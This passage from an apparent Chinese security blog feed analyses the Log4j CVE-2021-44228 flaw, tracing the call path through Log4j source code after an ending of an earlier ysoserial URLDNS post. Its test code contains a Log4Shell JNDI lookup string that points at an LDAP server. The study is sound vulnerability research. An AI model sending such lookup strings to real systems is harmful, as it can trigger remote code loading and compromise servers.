<p><a href="https://www.cnblogs.com/CoLo/p/15211200.html">Ysoserial URLDNS链分析 - Zh1z3ven - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13772184.html">Java安全之URLDNS链 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<p><a href="http://eyes.sh/login">DnsLog平台</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Log4j漏洞分析与利用</title>
    <url>/2023/04/27/Log4j-security/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Log4j是一个用于Java应用程序的日志记录工具，它提供了灵活的日志记录配置和强大的日志记录功能。Log4j允许开发人员在应用程序中记录不同级别的日志消息，并将这些消息输出到不同的目标（例如控制台、文件、数据库等）。</p>
<p><strong>Log4j的主要组件和概念如下</strong>：</p>
<p>日志记录器（Logger）：日志记录器是Log4j的核心组件。它负责接收应用程序中的日志消息并将其传递到适当的目标。每个日志记录器都有一个唯一的名称，开发人员可以根据需要创建多个日志记录器实例。</p>
<p>日志级别（Log Level）：Log4j定义了不同的日志级别，用于标识日志消息的重要性和严重程度。常见的日志级别包括DEBUG、INFO、WARN、ERROR和FATAL。开发人员可以根据应用程序的需求选择适当的日志级别。</p>
<p>Appender：Appender用于确定日志消息的输出目标。Log4j提供了多种类型的Appender，例如ConsoleAppender（将日志消息输出到控制台）、FileAppender（将日志消息输出到文件）、DatabaseAppender（将日志消息保存到数据库）等。开发人员可以根据需要配置和使用适当的Appender。</p>
<p>日志布局（Layout）：日志布局决定了日志消息在输出目标中的格式。Log4j提供了多种预定义的日志布局，例如简单的文本布局、HTML布局、JSON布局等。开发人员也可以自定义日志布局来满足特定的需求。</p>
<p>配置文件（Configuration File）：Log4j的配置文件用于指定日志记录器、Appender、日志级别和日志布局等的配置信息。配置文件通常是一个XML文件或属性文件。通过配置文件，开发人员可以灵活地配置日志系统，包括定义日志记录器的层次结构、指定日志级别和输出目标等。</p>
<p>Log4j提供了丰富的功能和灵活的配置选项，使开发人员能够根据应用程序的需求进行高度定制的日志记录。它已经成为Java应用程序中最受欢迎和广泛使用的日志记录框架之一。</p>
<h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><p>参考apache log4j官方文档：<a href="https://logging.apache.org/log4j/2.x/security.html">https://logging.apache.org/log4j/2.x/security.html</a><br>特别关注2021年年底CVE-2021-44228</p>
<h1 id="CVE-2021-44228分析"><a href="#CVE-2021-44228分析" class="headerlink" title="CVE-2021-44228分析"></a>CVE-2021-44228分析</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0-beta9到2.14.1</p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>log4j-2.14.1 jdk1.8_66<br>maven依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE202144228</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(CVE202144228.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/0xrsto&#125;&quot;</span>;</span><br><span class="line">        logger.error(<span class="string">&quot;error info:&#123;&#125;&quot;</span>,message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>根据JNDI的前置知识，在InitialContext类的lookup方法下断点或者NamingManager类的getObjectFactoryFromReference方法下断点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">221</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1110</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1033</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">344</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">540</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">498</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">481</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">456</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">63</span>, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2205</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2159</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2142</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2034</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1899</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">866</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">10</span>, CVE202144228 (org.example)</span><br></pre></td></tr></table></figure>

<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>logger是一个Logger对象，调用error方法，由于Logger中没有error方法，会调用其父类AbstractLogger中的error方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">(<span class="keyword">final</span> String message, <span class="keyword">final</span> Object p0)</span> &#123;</span><br><span class="line">    logIfEnabled(FQCN, Level.ERROR, <span class="literal">null</span>, message, p0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续调用父类AbstractLogger中的logIfEnabled方法，这里设置Level(日志级别)为ERROR</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Object p0)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否启用了指定的日志级别、标记和消息</span></span><br><span class="line">    <span class="keyword">if</span> (isEnabled(level, marker, message, p0)) &#123;</span><br><span class="line">        logMessage(fqcn, level, marker, message, p0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在logMessage方法中使用 messageFactory 创建一个 Message 对象，该对象表示包含消息和参数的格式化消息<br>中间的过程省略，来到Logger的log方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(<span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String fqcn, <span class="keyword">final</span> StackTraceElement location,</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> Message message, <span class="keyword">final</span> Throwable throwable)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取配置的可靠性策略</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReliabilityStrategy</span> <span class="variable">strategy</span> <span class="operator">=</span> privateConfig.loggerConfig.getReliabilityStrategy();</span><br><span class="line">    <span class="comment">// 检查该策略是否是 LocationAwareReliabilityStrategy 的实例</span></span><br><span class="line">    <span class="keyword">if</span> (strategy <span class="keyword">instanceof</span> LocationAwareReliabilityStrategy) &#123;</span><br><span class="line">        ((LocationAwareReliabilityStrategy) strategy).log(<span class="built_in">this</span>, getName(), fqcn, location, marker, level,</span><br><span class="line">            message, throwable);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        strategy.log(<span class="built_in">this</span>, getName(), fqcn, marker, level, message, throwable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这些都是log4j底层下的东西，继续往后分析，跳过中间步骤<br>来到PatternLayout类的toSerializable方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> StringBuilder <span class="title function_">toSerializable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buffer)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里的formatters是一个PatternFormatter数组</span></span><br><span class="line">    <span class="comment">// 每个PatternFormatter的converter属性都是一个继承LogEventPatternConverter的PatternConverter</span></span><br><span class="line">    <span class="comment">// 这些converter的作用是将不同的信息添加到最终的日志信息中</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> formatters.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        formatters[i].format(event, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (replace != <span class="literal">null</span>) &#123; <span class="comment">// creates temporary objects</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> buffer.toString();</span><br><span class="line">        str = replace.format(str);</span><br><span class="line">        buffer.setLength(<span class="number">0</span>);</span><br><span class="line">        buffer.append(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115163512.png"></p>
<p>代码断在i为8的时候，formatters[8]是一个MessagePatternConverter对象，调用其format方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 进入这里</span></span><br><span class="line">        converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的converter是MessagePatternConverter，调用其format方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="comment">// 如果msg实现了StringBuilderFormattable接口，进入这里</span></span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="comment">// textRenderer为null，这里直接为toAppendTo</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">doRender</span> <span class="operator">=</span> textRenderer != <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取初始长度作为偏移量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        <span class="comment">// 如果msg实现了MultiFormatStringBuilderFormattable接口</span></span><br><span class="line">        <span class="comment">// 不管进入哪个分支，都需要进行formatTo方法进行格式化，作用是将格式化的内容添加到workingBuilder中</span></span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 进入这里</span></span><br><span class="line">            ((StringBuilderFormattable) msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO can we optimize this?</span></span><br><span class="line">        <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// 检查workingBuilder中是否存在$&#123;&#125;格式的占位符</span></span><br><span class="line">                <span class="comment">// 得到i为64</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 提取offset到结尾的部分，相当于获取formatTo加上去的内容</span></span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 使用配置对象中的StrSubstitutor替换占位符为相应的值</span></span><br><span class="line">                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果需要渲染，则使用textRenderer对workingBuilder进行渲染，并将结果追加到toAppendTo中</span></span><br><span class="line">        <span class="keyword">if</span> (doRender) &#123;</span><br><span class="line">            textRenderer.render(workingBuilder, toAppendTo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 后面可以忽略</span></span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">        String result;</span><br><span class="line">        <span class="comment">// 如果消息实现了MultiformatMessage接口，调用getFormattedMessage方法获取格式化后的消息</span></span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiformatMessage) &#123;</span><br><span class="line">            result = ((MultiformatMessage) msg).getFormattedMessage(formats);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = msg.getFormattedMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 使用config中的StrSubstitutor替换占位符为相应的值</span></span><br><span class="line">            toAppendTo.append(config != <span class="literal">null</span> &amp;&amp; result.contains(<span class="string">&quot;$&#123;&quot;</span>)</span><br><span class="line">                    ? config.getStrSubstitutor().replace(event, result) : result);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            toAppendTo.append(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在执行formatTo方法之前<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115173350.png"><br>执行完formatTo方法之后<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115173519.png"><br>也就是说msg的formatTo方法是一个格式化的过程，将格式化的内容添加到workingBuilder中，也就是将源代码中的message替换{}<br>接下来进入for循环，这里主要判断在workingBuilder中是否存在${}格式的占位符，如果存在，就调用config.getStrSubstitutor().replace(event, value)方法进行替换<br>首先进入config.getStrSubstitutor()，进入的是AbstractConfiguration类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> StrSubstitutor <span class="title function_">getStrSubstitutor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> subst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115201706.png"><br>进入StrSubstitutor类的replace方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建一个StringBuilder对象buf，并将source作为初始内容</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">    <span class="comment">// 调用substitute方法进行替换操作，如果没有进行替换，则返回原始的source字符串</span></span><br><span class="line">    <span class="keyword">if</span> (!substitute(event, buf, <span class="number">0</span>, source.length())) &#123;</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115211353.png"><br>跳过中间的步骤来到StrSubstitutor类的substitute方法，这个方法用于多级插值的递归处理程序。这是主要的插值方法，用于解析传入文本中包含的所有变量引用的值。<br>这里有一个大的while循环，pos从0开始，从左到右遍历buf，chars的值为“error info:${jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;0xrsto}”</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (pos &lt; bufEnd) &#123;</span><br><span class="line">    <span class="comment">// 前缀匹配</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">startMatchLen</span> <span class="operator">=</span> prefixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">    <span class="keyword">if</span> (startMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">        pos++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="comment">// found variable start marker</span></span><br><span class="line">    <span class="keyword">if</span> (pos &gt; offset &amp;&amp; chars[pos - <span class="number">1</span>] == escape) &#123;</span><br><span class="line">        <span class="comment">// escaped</span></span><br><span class="line">        buf.deleteCharAt(pos - <span class="number">1</span>);</span><br><span class="line">        chars = getChars(buf);</span><br><span class="line">        lengthChange--;</span><br><span class="line">        altered = <span class="literal">true</span>;</span><br><span class="line">        bufEnd--;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 目标在这</span></span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115214250.png"><br>当pos为11的时候能够满足两个if条件(存在”${“)，进入else<br>else里面又存在一个while循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// find suffix</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">startPos</span> <span class="operator">=</span> pos;</span><br><span class="line">pos += startMatchLen;</span><br><span class="line"><span class="type">int</span> <span class="variable">endMatchLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">nestedVarCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (pos &lt; bufEnd) &#123;</span><br><span class="line">    <span class="keyword">if</span> (substitutionInVariablesEnabled</span><br><span class="line">            &amp;&amp; (endMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// found a nested variable start</span></span><br><span class="line">        nestedVarCount++;</span><br><span class="line">        pos += endMatchLen;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    endMatchLen = suffixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">    <span class="keyword">if</span> (endMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">        pos++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 目标在这</span></span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115215742.png"><br>这里是寻找后缀，即“}”，然后提取出中间的字符串“jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;0xrsto”，进入else中，进入这里<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115221647.png"><br>进入StrSubstitutor类resolveVariable方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取变量解析器</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115222343.png"></p>
<p>这个方法用于解析变量值的内部方法，进入Interpolator中的lookup方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找:分隔符的位置，PREFIX_SEPARATOR为:</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="comment">// 存在:</span></span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取前缀</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="comment">// 获取后缀</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 根据前缀在map中获取对应的StrLookup对象</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//存在lookup</span></span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 关键在这里</span></span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span 